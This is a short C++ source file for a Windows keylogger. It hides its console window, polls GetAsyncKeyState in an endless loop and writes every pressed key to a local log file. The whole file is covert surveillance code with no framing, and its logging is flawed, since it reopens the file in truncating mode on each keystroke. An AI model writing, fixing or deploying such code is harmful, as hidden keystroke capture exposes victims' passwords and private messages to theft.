#include <iostream>
#include <windows.h>
#include <fstream>
#include <string>
using namespace std;

void hideConsole(void);

int main(int nArgs, char* argv[]){
	hideConsole();
	string file;
	if(argv[1] != NULL){
		file = argv[1];
	}
	else{
		file = "log.txt";
	}
	ofstream log;
	log.open(file, ios::out);
	if(log.fail()){
		cout<<"There was a problem when opening the file."<<endl;
		return 0;
	}
	log.close();
	int count = 0;
	char key;
	int chr = 0;
	while(true){
		for(chr=0;chr<=255;chr++){
			if(GetAsyncKeyState(chr) == -32767){
				log.open(file, ios::out);
				log<<char(chr);
				if(count == 50){
					log<<"\n";
					count = 0;
				}
				else{
					count++;
				}
				log.close();
			}
		}
	}

	return 0;
}

void hideConsole(void){
	::ShowWindow(::GetConsoleWindow(), SW_HIDE);
	return;
}

